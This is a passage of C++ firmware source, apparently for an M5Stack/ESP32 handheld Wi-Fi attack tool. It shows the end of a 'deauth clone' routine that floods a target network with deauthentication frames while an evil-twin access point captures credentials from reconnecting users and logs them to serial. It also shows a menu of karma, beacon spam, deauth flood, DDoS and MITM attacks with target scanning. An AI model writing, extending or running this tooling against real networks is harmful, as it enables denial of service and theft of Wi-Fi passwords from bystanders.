            
            M5.Display.fillRect(4, 52, SCREEN_WIDTH - 8, SCREEN_HEIGHT - 60, kitenConfig.bgColor);
            M5.Display.setCursor(4, 52);
            M5.Display.println("Status: " + String(deauthPaused ? "PAUSED" : "ATTACKING"));
            M5.Display.println("Time: " + String(elapsed) + "s");
            M5.Display.println("Deauth: ~" + String(totalDeauths) + " (" + String(deauthRate, 0) + "/s)");
            M5.Display.println("Creds: " + String(capturedCount));
            if (lastCred.length() > 0) {
                M5.Display.println("Last: " + lastCred.substring(0, 28));
            }
            M5.Display.println("");
            M5.Display.println("SEL: pause/resume deauth");
            M5.Display.println("BACK: stop attack");
        }
        
        
        M5.update();
        pollKeyboard();
        
        if (check(SelPress)) {
            
            deauthPaused = !deauthPaused;
            uiBeep(deauthPaused ? 440 : 660, 30);
            waitAllKeysReleased();
            Serial.println("[DEAUTH_CLONE] Deauth " + String(deauthPaused ? "PAUSED" : "RESUMED"));
        }
        
        if (check(EscPress)) {
            
            uiBeep(440, 30);
            waitAllKeysReleased();
            
            std::vector<Option> exitOpts = {
                {"Stop Attack", [&shouldExit]() { shouldExit = true; }},
                {"View Stats", [&]() {
                    String stats = String("=== Attack Statistics ===\\n\\n") +
                                  "Target: " + tssid + "\\n" +
                                  "Duration: " + String((millis() - startTime) / 1000) + "s\\n" +
                                  "Deauths sent: ~" + String(totalDeauths) + "\\n" +
                                  "Credentials: " + String(capturedCount) + "\\n";
                    if (lastCred.length() > 0) {
                        stats += "\\nLast cred:\\n" + lastCred;
                    }
                    displayInfo(stats, true);
                }},
                {"Resume", [](){}},
            };
            loopOptions(exitOpts, MENU_TYPE_SUBMENU, "Exit?");
        }
        
        delay(5);  
    }
    
    
    
    
    Serial.println("[DEAUTH_CLONE] Cleaning up...");
    
    server.end();
    delay(100);
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.mode(WIFI_OFF);
    
    
    unsigned long totalTime = (millis() - startTime) / 1000;
    String summary = String("Attack Stopped\\n\\n") +
                      "Target: " + tssid + "\\n" +
                      "Duration: " + String(totalTime) + "s\\n" +
                      "Deauths sent: ~" + String(totalDeauths) + "\\n" +
                      "Credentials captured: " + String(capturedCount) + "\\n\\n";
    
    if (capturedCount > 0) {
        summary += "SUCCESS! Check serial\\nmonitor for credentials!";
    } else {
        summary += "No credentials captured.\\nDevices may not have\\nreconnected to fake AP.";
    }
    
    displayInfo(summary, true);
    Serial.println("[DEAUTH_CLONE] Attack finished!");
    Serial.println(summary);
}

void wifiAtkMenu()
{
    for (;;) {
        bool scanAtks = false;
        std::vector<Option> opts = {
            {"Target Atks",  [&]() { scanAtks = true; }},
            {"Karma Attack", [=]() { karmaSetup();    }},
            {"Beacon SPAM",  [&]() { beaconAttack();   }},
            {"Deauth Flood", [&]() { deauthFloodAttack(); }},
            {"DDoS",        []() { ddosMenuEntry();     }},
            {"MITM",        []() { mitmAttackMenuEntry(); }},
            {"Target Deauth", []() { wifiDeauthMenuEntry(); }},
            {"Back",         [](){}},
        };
        int sel = loopOptions(opts, MENU_TYPE_SUBMENU, "Wifi Atks");
        if (sel == -1 || sel == (int)opts.size() - 1) return;

        if (scanAtks) {
            
            
            displayInfo("Scanning for targets..", false);
            
            
            WiFi.mode(WIFI_STA);
            delay(100);
            
            int nets = WiFi.scanNetworks(false, showHiddenNetworks, true);  

            if (nets == 0) {
                displayError("No networks found\nTry moving closer to APs", true);
                continue;
            }

            
            
            struct TargetAP {
                String ssid;
                String bssidStr;
                uint8_t channel;
                int32_t rssi;
                int encType;
            };
            std::vector<TargetAP> targets;
            targets.reserve(nets);

            std::vector<Option> opts2;
            for (int i = 0; i < nets; i++) {
                TargetAP t;
                t.ssid = WiFi.SSID(i);
                t.bssidStr = WiFi.BSSIDstr(i);
                t.channel = (uint8_t)WiFi.channel(i);
                t.rssi = WiFi.RSSI(i);
                t.encType = WiFi.encryptionType(i);
                targets.push_back(t);

                String dispSsid = t.ssid.length() == 0 ?
                    String("<Hidden> ") + t.bssidStr : t.ssid;
                String encStr = (t.encType == WIFI_AUTH_OPEN) ? "OPEN" : "SEC";
                String optionText = dispSsid + " [" + encStr + "] (" + String(t.rssi) +
                                    "dBm|ch." + String(t.channel) + ")";
                int idx = i;
                opts2.push_back({optionText, [=]() {
                    
                    
                    targetAtkMenu(targets[idx].ssid,
                                  targets[idx].bssidStr,
                                  targets[idx].channel);
                }});
            }
            opts2.push_back({"Back", [](){}});
            WiFi.scanDelete();
            
            int pickResult = loopOptions(opts2, MENU_TYPE_REGULAR, "Pick Target");
            
            
            wifi_atk_unsetWifi();
        }
    }
}
